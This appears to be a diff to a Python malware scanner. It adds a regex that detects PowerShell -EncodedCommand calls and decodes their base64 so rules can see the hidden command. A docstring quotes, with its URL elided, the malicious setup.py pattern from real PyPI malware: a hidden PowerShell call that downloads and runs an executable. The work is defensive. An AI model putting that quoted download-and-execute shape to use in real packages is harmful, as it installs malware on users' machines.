@@ -197,3 +197,92 @@ def _close_paren(window: str) -> int:
 
 
 __all__ = ["LANGUAGES", "MAX_COMMANDS", "MAX_COMMAND_CHARS", "Command", "extract"]
+
+
+ENCODED_COMMAND = re.compile(
+    r"""(?ix)
+    \b(?:powershell|pwsh)(?:\.exe)?\b        # the interpreter, named
+    [^\n]{0,120}?                            # and its other switches
+    # PowerShell accepts any unambiguous prefix of -EncodedCommand, so `-e`,
+    # `-ec`, `-enc` and `-encodedcommand` are the same switch. `-e` alone is two
+    # characters and would match a great deal, which is why the blob below is
+    # required: a switch followed by sixteen or more base64 characters is not an
+    # accident.
+    [-/](?:e|ec|enc|enco|encod|encode|encoded|encodedc|encodedcommand)
+    [\s:=]{1,4}
+    ["']?([A-Za-z0-9+/=]{16,8192})["']?
+    """,
+)
+"""`powershell -EncodedCommand <base64>`, and every abbreviation of the switch.
+
+This is the shape that made the measurement worth running. Of 201 real malicious
+PyPI packages sampled from the ASE 2023 dataset, 109 of the 171 that produced no
+blocking finding were this one technique -- the EsqueleSquad campaign and its
+relatives -- written in a `setup.py` as
+
+    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand <base64>')
+
+where the base64 decodes to `Invoke-WebRequest -Uri "https://.../x.exe" -OutFile
+"~/WindowsCache.exe"; Invoke-Expression "~/WindowsCache.exe"`.
+
+Cordon labelled the call `spawn`, and the shell pack's own `-enc` pattern
+labelled it `execute`, and there it stopped. It never got `decode`, because the
+decoding is done by `powershell.exe` rather than by any call in the file, and it
+never got `egress`, because the URL is inside the blob. So the dropper composite
+had no egress and the decode-and-execute composite had no decode, and an
+install-time download-and-run was invisible."""
+
+MAX_ENCODED_BLOB = 8192
+"""Longer than this is not decoded. A bounded slice keeps a hostile file from
+turning one pattern match into megabytes of work."""
+
+
+def decode_encoded_commands(commands: list[Command]) -> list[Command]:
+    """The commands, plus the plaintext of any encoded command among them.
+
+    Appended rather than substituted. The encoded form is evidence in itself --
+    the shell pack matches `-enc` as an execute, and a switch whose purpose is to
+    keep a command out of a log is worth reporting whether or not it decodes --
+    so both are handed on and the rules see each.
+
+    PowerShell encodes UTF-16LE, which is what the switch is specified to take.
+    UTF-8 is tried second because the shape gets copied into other contexts by
+    people who did not read the specification, and a payload that decodes either
+    way should be read either way.
+    """
+    out = list(commands)
+    for command in commands:
+        if len(out) >= MAX_COMMANDS * 2:
+            break
+        for match in ENCODED_COMMAND.finditer(command.text):
+            plain = _decode_blob(match.group(1))
+            if plain:
+                out.append(Command(text=plain[:MAX_COMMAND_CHARS], line=command.line))
+    return out
+
+
+def _decode_blob(blob: str) -> str:
+    """The blob's plaintext, or an empty string if it does not read as text.
+
+    Base64 that decodes to bytes nobody would call a command is not treated as a
+    command. What is being asked is whether the author hid a program here, and a
+    run of control characters answers no.
+    """
+    import base64
+    import binascii
+
+    if len(blob) > MAX_ENCODED_BLOB:
+        return ""
+    try:
+        raw = base64.b64decode(blob + "=" * (-len(blob) % 4), validate=False)
+    except (binascii.Error, ValueError):
+        return ""
+    for encoding in ("utf-16-le", "utf-8"):
+        try:
+            text = raw.decode(encoding)
+        except (UnicodeDecodeError, LookupError):
+            continue
+        printable = sum(1 for character in text if character.isprintable() or character in "\t\n\r")
+        if text and printable / len(text) > 0.9:
+            return text
+    return ""
